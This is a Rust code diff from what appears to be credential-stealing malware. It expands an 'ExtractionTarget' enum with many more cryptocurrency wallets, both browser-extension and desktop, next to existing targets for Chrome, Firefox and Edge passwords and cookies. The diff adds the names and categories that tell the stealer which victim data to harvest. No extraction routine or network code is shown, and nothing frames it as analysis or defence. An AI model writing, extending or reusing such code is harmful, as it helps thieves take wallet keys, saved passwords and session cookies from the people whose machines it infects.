@@ -3,13 +3,28 @@ use std::collections::BTreeMap;
 /// Types of data that can be extracted
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
 pub enum ExtractionTarget {
-    // Wallets
+    // Browser Extension Wallets
     MetaMask,
+    Phantom,
+    TrustWallet,
+    Rabby,
+    CoinbaseWallet,
+    BinanceWallet,
+    OKXWallet,
+    LedgerLive,
+    MathWallet,
+    AtomexWallet,
+    JaxxWallet,
+    MyEtherWallet,
+
+    // Desktop Wallets
     Exodus,
     Electrum,
     BitcoinCore,
-    TrustWallet,
     AtomicWallet,
+    Armory,
+    WasabiWallet,
+    SparrowWallet,
 
     // Browsers
     ChromePasswords,
@@ -32,12 +47,28 @@ pub enum ExtractionTarget {
 impl ExtractionTarget {
     pub fn as_str(&self) -> &'static str {
         match self {
+            // Browser Extension Wallets
             Self::MetaMask => "metamask",
+            Self::Phantom => "phantom",
+            Self::TrustWallet => "trust_wallet",
+            Self::Rabby => "rabby",
+            Self::CoinbaseWallet => "coinbase_wallet",
+            Self::BinanceWallet => "binance_wallet",
+            Self::OKXWallet => "okx_wallet",
+            Self::LedgerLive => "ledger_live",
+            Self::MathWallet => "math_wallet",
+            Self::AtomexWallet => "atomex_wallet",
+            Self::JaxxWallet => "jaxx_wallet",
+            Self::MyEtherWallet => "myetherwallet",
+
+            // Desktop Wallets
             Self::Exodus => "exodus",
             Self::Electrum => "electrum",
             Self::BitcoinCore => "bitcoin_core",
-            Self::TrustWallet => "trust_wallet",
             Self::AtomicWallet => "atomic_wallet",
+            Self::Armory => "armory",
+            Self::WasabiWallet => "wasabi_wallet",
+            Self::SparrowWallet => "sparrow_wallet",
 
             Self::ChromePasswords => "chrome_passwords",
             Self::ChromeCookies => "chrome_cookies",
@@ -57,8 +88,13 @@ impl ExtractionTarget {
 
     pub fn category(&self) -> &'static str {
         match self {
-            Self::MetaMask | Self::Exodus | Self::Electrum |
-            Self::BitcoinCore | Self::TrustWallet | Self::AtomicWallet => "wallet",
+            Self::MetaMask | Self::Phantom | Self::TrustWallet |
+            Self::Rabby | Self::CoinbaseWallet | Self::BinanceWallet |
+            Self::OKXWallet | Self::LedgerLive | Self::MathWallet |
+            Self::AtomexWallet | Self::JaxxWallet | Self::MyEtherWallet |
+            Self::Exodus | Self::Electrum | Self::BitcoinCore |
+            Self::AtomicWallet | Self::Armory | Self::WasabiWallet |
+            Self::SparrowWallet => "wallet",
 
             Self::ChromePasswords | Self::ChromeCookies | Self::ChromeHistory |
             Self::FirefoxPasswords | Self::FirefoxCookies | Self::EdgePasswords => "browser",
@@ -114,7 +150,7 @@ impl ExtractionResult {
     pub fn success(target: ExtractionTarget, data: Vec<ExtractedData>) -> Self {
         let bytes = data.iter().map(|d| d.content.len()).sum();
         let items = data.len();
-        
+
         Self {
             target,
             success: true,
@@ -124,7 +160,7 @@ impl ExtractionResult {
             bytes_extracted: bytes,
         }
     }
-    
+
     pub fn failure(target: ExtractionTarget, error: String) -> Self {
         Self {
             target,
